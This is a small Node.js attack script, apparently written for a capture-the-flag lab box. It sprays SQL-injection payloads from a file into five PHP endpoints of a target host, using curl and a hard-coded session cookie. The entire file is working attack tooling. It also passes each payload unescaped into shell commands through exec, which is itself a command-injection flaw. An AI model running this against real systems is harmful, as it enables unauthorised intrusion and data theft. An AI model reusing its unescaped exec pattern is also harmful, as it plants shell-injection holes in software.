const lineReader = require('line-reader');
const { exec } = require('child_process');

lineReader.eachLine('sqli', (line) => {
    exec(`curl 'http://10.10.10.176/download.php?file=${line}' -H 'Cookie: PHPSESSID=0fncmaana43q3m5o8usmu2s0i0' --compressed --insecure`);
    exec(`curl 'http://10.10.10.176/search.php?search=${line}' -H 'Cookie: PHPSESSID=0fncmaana43q3m5o8usmu2s0i0' --compressed --insecure`);
    exec(`curl 'http://10.10.10.176/feedback.php' -X POST -H 'Cookie: PHPSESSID=0fncmaana43q3m5o8usmu2s0i0' --data 'title=a&feedback=${line}' --compressed --insecure`);
    exec(`curl 'http://10.10.10.176/contact.php' -H 'Cookie: PHPSESSID=0fncmaana43q3m5o8usmu2s0i0' --data 'message=${line}' --compressed --insecure`);
    exec(`curl 'http://10.10.10.176/profile.php' -X POST -H 'Cookie: PHPSESSID=0fncmaana43q3m5o8usmu2s0i0' --data 'name=${line}' --compressed --insecure`);
    console.log(line);
});
